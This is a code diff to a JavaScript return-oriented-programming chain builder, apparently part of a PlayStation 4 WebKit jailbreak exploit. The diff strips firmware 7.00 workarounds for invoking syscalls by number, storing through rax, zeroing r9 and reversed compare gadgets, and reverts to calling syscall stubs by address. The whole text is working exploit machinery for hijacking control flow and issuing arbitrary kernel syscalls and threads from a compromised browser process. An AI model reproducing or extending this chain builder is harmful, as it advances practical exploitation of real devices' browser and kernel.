@@ -43,9 +43,6 @@ class rop {
     clear() {
         this.count = this.initial_count;
         this.branches_count = 0;
-        /* Reset alongside the chain body so the list always describes the
-           launch that is about to run, not the one before it. */
-        this.syscList = [];
 
         this.stack_array.set(this.zeroed_stack);
     }
@@ -81,66 +78,32 @@ class rop {
         this.push(this.gadgets["mov [rdi], eax"]);
     }
 
-    // Some profiles have no working `mov [rdi], rsi ; ret`. 7.00's 0x7527F0 is
-    // one: probe=p proved pop rdi and pop rsi are both correct, and probe=w --
-    // the same two pops plus this store -- crashes, so the store is the fault.
-    // Those profiles set OFFSET_wk_store_via_rax and every 8-byte store is
-    // routed through `mov [rdi], rax` instead, which write_result already uses.
-    static storeViaRax() {
-        return (typeof OFFSET_wk_store_via_rax !== "undefined")
-            && OFFSET_wk_store_via_rax;
-    }
-
-    push_store8(dest_already_in_rdi, value) {
-        if (rop.storeViaRax()) {
-            this.push(this.gadgets["pop rax"]);
-            this.push(value);
-            this.push(this.gadgets["mov [rdi], rax"]);
-        } else {
-            this.push(this.gadgets["pop rsi"]);
-            this.push(value);
-            this.push(this.gadgets["mov [rdi], rsi"]);
-        }
-    }
-
     push_write8(dest, value) {
         this.push(this.gadgets["pop rdi"]);
         this.push(dest);
-        this.push_store8(dest, value);
+        this.push(this.gadgets["pop rsi"]);
+        this.push(value);
+        this.push(this.gadgets["mov [rdi], rsi"]);
     }
 
     push_copy8(dest, src) {
         this.push(this.gadgets["pop rax"]);
         this.push(src);
         this.push(this.gadgets["mov rax, [rax]"]);
-        if (rop.storeViaRax()) {
-            // value is already in rax -- store it straight out
-            this.push(this.gadgets["pop rdi"]);
-            this.push(dest);
-            this.push(this.gadgets["mov [rdi], rax"]);
-        } else {
-            this.push_set_reg_from_rax("rsi");
-            this.push(this.gadgets["pop rdi"]);
-            this.push(dest);
-            this.push(this.gadgets["mov [rdi], rsi"]);
-        }
+        this.push_set_reg_from_rax("rsi");
+        this.push(this.gadgets["pop rdi"]);
+        this.push(dest);
+        this.push(this.gadgets["mov [rdi], rsi"]);
     }
 
     push_write_ptr8(dest, value) {
         this.push(this.gadgets["pop rax"]);
         this.push(value);
         this.push(this.gadgets["mov rax, [rax]"]);
-        if (rop.storeViaRax()) {
-            // value is already in rax -- store it straight out
-            this.push(this.gadgets["pop rdi"]);
-            this.push(dest);
-            this.push(this.gadgets["mov [rdi], rax"]);
-        } else {
-            this.push_set_reg_from_rax("rsi");
-            this.push(this.gadgets["pop rdi"]);
-            this.push(dest);
-            this.push(this.gadgets["mov [rdi], rsi"]);
-        }
+        this.push_set_reg_from_rax("rsi");
+        this.push(this.gadgets["pop rdi"]);
+        this.push(dest);
+        this.push(this.gadgets["mov [rdi], rsi"]);
     }
 
     write_result(dest) {
@@ -183,25 +146,8 @@ class rop {
         }
 
         if (r9 != undefined) {
-            // Some builds (7.00) have no `pop r9 ; ret` at all; their profile
-            // supplies a zeroing gadget that consumes no stack slot instead.
-            // Every 6-argument call the engine makes passes r9 = 0, so this is
-            // exact -- but refuse loudly rather than silently pass 0 if that
-            // ever stops being true.
-            if (typeof OFFSET_wk_r9_zero_only !== "undefined"
-                && OFFSET_wk_r9_zero_only) {
-                const isZero = (typeof r9 === "number")
-                    ? r9 === 0
-                    : (r9 && r9.low === 0 && r9.hi === 0);
-                if (!isZero)
-                    throw new Error("this firmware profile can only set r9 = 0"
-                        + " (no `pop r9 ; ret` in libSceNKWebKit), but r9 = "
-                        + r9.toString());
-                this.push(this.gadgets["pop r9"]);
-            } else {
-                this.push(this.gadgets["pop r9"]);
-                this.push(r9);
-            }
+            this.push(this.gadgets["pop r9"]);
+            this.push(r9);
         }
 
     }
@@ -214,53 +160,8 @@ class rop {
         this.push(rip);
     }
 
-    /* Invoke a syscall by NUMBER rather than by stub address.
-       -------------------------------------------------------------------
-       Every stub is `mov rax, NR ; mov r10, rcx ; syscall ; jb err ; ret`,
-       identical in all 328 cases but for the immediate. So the tail at
-       stub+7 is a general-purpose syscall instruction: set rax with the
-       `pop rax` gadget and any number becomes reachable through it.
-
-       That matters on 7.00.00.70, where the stub block gained entries and
-       272 of the addresses in syscall_map are interpolated across a step
-       rather than measured. Those addresses are now irrelevant -- only ONE
-       stub has to be right, and getpid's was read straight out of the
-       import GOT and proved by returning a plausible pid.
-
-       rax must be loaded AFTER push_sysv: this build has no `pop r9`, and
-       the stand-in it uses (`xor r9d,r9d ; test r9,r9 ; setne al ; ret`)
-       clobbers al. */
-    fsyscall(sysc, rdi, rsi, rdx, rcx, r8, r9) {
-        /* Record what this chain is made of. A hung chain currently reports
-           only a slot count, and "14 slots" fits any three-argument syscall --
-           which is not enough to tell socket() apart from a blocking read().
-           The numbers cost nothing to keep and name the call outright. */
-        (this.syscList = this.syscList || []).push(sysc);
-        /* An address that was PROVEN by behaviour beats a number that was only
-           inferred. pipe2 is the case: the byte round trip proved lk+0x36900
-           makes a working pipe, but plain pipe() would pass that same test, so
-           it never proved the NUMBER is 0x2af -- and calling 0x2af by number
-           hangs, which says it is not. Where the address is demonstrated and
-           the number is not, jump to the address and leave rax alone. */
-        if (this.p.provenAddr && this.p.provenAddr[sysc]) {
-            this.fcall(this.p.provenAddr[sysc], rdi, rsi, rdx, rcx, r8, r9);
-            return;
-        }
-        if (!this.p.syscall_insn) {
-            this.fcall(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
-            return;
-        }
-        this.push_sysv(rdi, rsi, rdx, rcx, r8, r9);
-        this.push(this.gadgets["pop rax"]);
-        this.push(sysc);
-        if (this.stack_entry_point.add32(this.count * 0x8).low & 0x8) {
-            this.push(this.gadgets["ret"]);
-        }
-        this.push(this.p.syscall_insn);
-    }
-
     add_syscall(sysc, rdi, rsi, rdx, rcx, r8, r9) {
-        this.fsyscall(sysc, rdi, rsi, rdx, rcx, r8, r9);
+        this.fcall(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
     }
 
     get_rsp() {
@@ -274,69 +175,6 @@ class rop {
 
     self_healing_syscall(sysc, rdi, rsi, rdx, rcx, r8, r9) {
         this.push_sysv(rdi, rsi, rdx, rcx, r8, r9);
-        /* By number here too, not by stub address.
-           ---------------------------------------------------------------
-           This form reserves four slots -- three `ret` placeholders and the
-           call target -- and re-arms itself by writing the same four values
-           back over them. That happens to be exactly the room the by-number
-           sequence needs: ret, `pop rax`, the number, then the syscall
-           instruction. So the self-healing property is kept while the stub
-           address stops mattering.
-
-           It has to stop mattering. 272 of the addresses in syscall_map were
-           interpolated across a step rather than measured, the block is a
-           0x20 grid, and this is the one path that jumps to them raw. A miss
-           by one slot runs a different syscall -- which is what
-           "driver affinity did not read back after the restore" and the
-           worker never answering look like from the outside.
-
-           Alignment is decided BEFORE the four slots rather than between
-           them: the original could pad in the middle only because all three
-           placeholders were the same `ret`. These four are not
-           interchangeable, so the pad goes in front and the target keeps the
-           parity it had. */
-        (this.syscList = this.syscList || []).push(sysc);
-        const proven = this.p.provenAddr && this.p.provenAddr[sysc];
-        if (!proven && this.p.syscall_insn) {
-            if (this.stack_entry_point.add32((this.count + 3) * 0x8).low & 0x8)
-                this.push(this.gadgets["ret"]);
-            const rp = this.get_rsp();
-            this.push(this.gadgets["ret"]);
-            this.push(this.gadgets["pop rax"]);
-            this.push(sysc);
-            this.push(this.p.syscall_insn);
-            /* Preserve rax across the re-arm.
-               -----------------------------------------------------------
-               The caller's next act is write_result4(), which reads eax to
-               capture what the syscall returned. But the four push_write8
-               calls below go through push_store8, and on a build with
-               OFFSET_wk_store_via_rax -- which 7.00 is, because its
-               `mov [rdi], rsi` is unusable -- each one loads its value with
-               `pop rax`. So the syscall's return is overwritten four times
-               before anyone reads it, and the caller records whatever the
-               last store happened to leave behind.
-               That is what "cpuset_setaffinity returned 51834055" is: not a
-               kernel error code, just the tail of a gadget address. Save rax
-               to scratch first and reload it after, using `mov rax, [rax]`,
-               which is verified on this build. */
-            const sc = this.p.sysScratch;
-            if (sc) {
-                this.push(this.gadgets["pop rdi"]);
-                this.push(sc);
-                this.push(this.gadgets["mov [rdi], rax"]);
-            }
-            this.push_write8(rp, this.gadgets["ret"]);
-            this.push_write8(rp.add32(0x08), this.gadgets["pop rax"]);
-            this.push_write8(rp.add32(0x10), sysc);
-            this.push_write8(rp.add32(0x18), this.p.syscall_insn);
-            if (sc) {
-                this.push(this.gadgets["pop rax"]);
-                this.push(sc);
-                this.push(this.gadgets["mov rax, [rax]"]);
-            }
-            return;
-        }
-
         let restore_point = this.get_rsp();
         this.push(this.gadgets["ret"]);
         this.push(this.gadgets["ret"]);
@@ -346,23 +184,11 @@ class rop {
             this.push(this.gadgets["ret"]);
             restore_point.add32inplace(0x8);
         }
-        const target = proven || this.syscalls[sysc];
-        this.push(target);
-        const sc2 = this.p.sysScratch;      // same rax problem as above
-        if (sc2) {
-            this.push(this.gadgets["pop rdi"]);
-            this.push(sc2);
-            this.push(this.gadgets["mov [rdi], rax"]);
-        }
+        this.push(this.syscalls[sysc]);
         this.push_write8(restore_point, this.gadgets["ret"]);
         this.push_write8(restore_point.add32(0x08), this.gadgets["ret"]);
         this.push_write8(restore_point.add32(0x10), this.gadgets["ret"]);
-        this.push_write8(restore_point.add32(0x18), target);
-        if (sc2) {
-            this.push(this.gadgets["pop rax"]);
-            this.push(sc2);
-            this.push(this.gadgets["mov rax, [rax]"]);
-        }
+        this.push_write8(restore_point.add32(0x18), this.syscalls[sysc]);
     }
 
    push_set_reg_from_rax(target_reg) {
@@ -476,69 +302,6 @@ class rop {
             }
         }
 
-        /* By number here too, not by stub address.
-           ---------------------------------------------------------------
-           This form reserves four slots -- three `ret` placeholders and the
-           call target -- and re-arms itself by writing the same four values
-           back over them. That happens to be exactly the room the by-number
-           sequence needs: ret, `pop rax`, the number, then the syscall
-           instruction. So the self-healing property is kept while the stub
-           address stops mattering.
-
-           It has to stop mattering. 272 of the addresses in syscall_map were
-           interpolated across a step rather than measured, the block is a
-           0x20 grid, and this is the one path that jumps to them raw. A miss
-           by one slot runs a different syscall -- which is what
-           "driver affinity did not read back after the restore" and the
-           worker never answering look like from the outside.
-
-           Alignment is decided BEFORE the four slots rather than between
-           them: the original could pad in the middle only because all three
-           placeholders were the same `ret`. These four are not
-           interchangeable, so the pad goes in front and the target keeps the
-           parity it had. */
-        (this.syscList = this.syscList || []).push(sysc);
-        const proven = this.p.provenAddr && this.p.provenAddr[sysc];
-        if (!proven && this.p.syscall_insn) {
-            if (this.stack_entry_point.add32((this.count + 3) * 0x8).low & 0x8)
-                this.push(this.gadgets["ret"]);
-            const rp = this.get_rsp();
-            this.push(this.gadgets["ret"]);
-            this.push(this.gadgets["pop rax"]);
-            this.push(sysc);
-            this.push(this.p.syscall_insn);
-            /* Preserve rax across the re-arm.
-               -----------------------------------------------------------
-               The caller's next act is write_result4(), which reads eax to
-               capture what the syscall returned. But the four push_write8
-               calls below go through push_store8, and on a build with
-               OFFSET_wk_store_via_rax -- which 7.00 is, because its
-               `mov [rdi], rsi` is unusable -- each one loads its value with
-               `pop rax`. So the syscall's return is overwritten four times
-               before anyone reads it, and the caller records whatever the
-               last store happened to leave behind.
-               That is what "cpuset_setaffinity returned 51834055" is: not a
-               kernel error code, just the tail of a gadget address. Save rax
-               to scratch first and reload it after, using `mov rax, [rax]`,
-               which is verified on this build. */
-            const sc = this.p.sysScratch;
-            if (sc) {
-                this.push(this.gadgets["pop rdi"]);
-                this.push(sc);
-                this.push(this.gadgets["mov [rdi], rax"]);
-            }
-            this.push_write8(rp, this.gadgets["ret"]);
-            this.push_write8(rp.add32(0x08), this.gadgets["pop rax"]);
-            this.push_write8(rp.add32(0x10), sysc);
-            this.push_write8(rp.add32(0x18), this.p.syscall_insn);
-            if (sc) {
-                this.push(this.gadgets["pop rax"]);
-                this.push(sc);
-                this.push(this.gadgets["mov rax, [rax]"]);
-            }
-            return;
-        }
-
         let restore_point = this.get_rsp();
         this.push(this.gadgets["ret"]);
         this.push(this.gadgets["ret"]);
@@ -548,23 +311,11 @@ class rop {
             this.push(this.gadgets["ret"]);
             restore_point.add32inplace(0x8);
         }
-        const target = proven || this.syscalls[sysc];
-        this.push(target);
-        const sc2 = this.p.sysScratch;      // same rax problem as above
-        if (sc2) {
-            this.push(this.gadgets["pop rdi"]);
-            this.push(sc2);
-            this.push(this.gadgets["mov [rdi], rax"]);
-        }
+        this.push(this.syscalls[sysc]);
         this.push_write8(restore_point, this.gadgets["ret"]);
         this.push_write8(restore_point.add32(0x08), this.gadgets["ret"]);
         this.push_write8(restore_point.add32(0x10), this.gadgets["ret"]);
-        this.push_write8(restore_point.add32(0x18), target);
-        if (sc2) {
-            this.push(this.gadgets["pop rax"]);
-            this.push(sc2);
-            this.push(this.gadgets["mov rax, [rax]"]);
-        }
+        this.push_write8(restore_point.add32(0x18), this.syscalls[sysc]);
     }
 
     push_inc8(dest, value) {
@@ -615,16 +366,6 @@ class rop {
         this.push(this.gadgets["cmp [rcx], eax"]);
         this.push(this.gadgets["pop rax"]);
         this.push(0);
-
-        // Some builds (7.00) only have `cmp eax, [rcx] ; ret`. ZF survives the
-        // operand swap, so EQUAL is exact; the ordered types would silently
-        // invert, so refuse them.
-        if (typeof OFFSET_wk_cmp_operands_reversed !== "undefined"
-            && OFFSET_wk_cmp_operands_reversed
-            && type != this.branch_types.EQUAL) {
-            throw new Error("this firmware profile's compare gadget has"
-                + " reversed operands; only branch_types.EQUAL is supported");
-        }
 
         if (type == this.branch_types.EQUAL) {
             this.push(this.gadgets["sete al"]);
@@ -743,21 +484,15 @@ class worker_rop extends rop {
     }
 
     async syscall(sysc, rdi, rsi, rdx, rcx, r8, r9) {
-        this.fsyscall(sysc, rdi, rsi, rdx, rcx, r8, r9);
-        this.write_result(this.return_value);
-        await this.run();
-        return this.p.read8(this.return_value);
+        return await this.call(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
     }
 
     async syscall_int32(sysc, rdi, rsi, rdx, rcx, r8, r9) {
-        this.fsyscall(sysc, rdi, rsi, rdx, rcx, r8, r9);
-        this.write_result4(this.return_value);
-        await this.run();
-        return this.p.read4(this.return_value) << 0;
+        return await this.call32(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
     }
 
     add_syscall_ret(retstore, sysc, rdi, rsi, rdx, rcx, r8, r9) {
-        this.fsyscall(sysc, rdi, rsi, rdx, rcx, r8, r9);
+        this.fcall(this.syscalls[sysc], rdi, rsi, rdx, rcx, r8, r9);
         this.write_result(retstore);
     }
 
@@ -827,12 +562,8 @@ class thread_rop extends rop {
 
     async spawn_thread() {
 
-        this.fcall(this.p.libKernelBase.add32(this.p.lkfix
-            ? this.p.lkfix(OFFSET_lk_pthread_exit)
-            : OFFSET_lk_pthread_exit), 0x44414544);
-        await this.chain.call(this.p.libKernelBase.add32(this.p.lkfix
-            ? this.p.lkfix(OFFSET_lk_pthread_create_name_np)
-            : OFFSET_lk_pthread_create_name_np), this.stack_memory.add32(0x48), 0x0, this.p.libSceLibcInternalBase.add32(OFFSET_lc_longjmp), this.stack_memory, this.stack_memory.add32(0x50));
+        this.fcall(this.p.libKernelBase.add32(OFFSET_lk_pthread_exit), 0x44414544);
+        await this.chain.call(this.p.libKernelBase.add32(OFFSET_lk_pthread_create_name_np), this.stack_memory.add32(0x48), 0x0, this.p.libSceLibcInternalBase.add32(OFFSET_lc_longjmp), this.stack_memory, this.stack_memory.add32(0x50));
         return this.p.read8(this.stack_memory.add32(0x48));
     }
 
